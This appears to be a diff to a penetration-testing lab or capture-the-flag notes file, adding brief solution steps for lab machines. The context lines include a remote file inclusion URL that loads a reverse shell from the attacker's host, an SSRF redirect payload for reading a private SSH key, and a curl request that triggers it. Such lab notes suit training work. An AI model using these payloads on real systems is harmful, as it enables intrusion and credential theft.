@@ -36,6 +36,10 @@
 1. Google suggests `http://{{RHOST}}/image.php?img=http://{{LHOST}}/rev.php` 
 2. Look around for db creds, get user creds from mysql 
 
+#### SpiderSociety => systemctl 
+1. Run `gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -u http://{{LHOST}}` 
+2. Check ftp to find hidden web page with ssh creds 
+
 #### Symbolic => SSRF for PDF uploads  
 1. **Must** use apache2 & 'header' => `<?php header('Location: file:///Users/{{USERNAME}}/.ssh/id_rsa'); ?>` 
 2. Run `curl -i -s -k -XPOST --data-binary 'url=192.168.36.128%2Findex.php' 'http://192.168.36.131/Process.php'` 
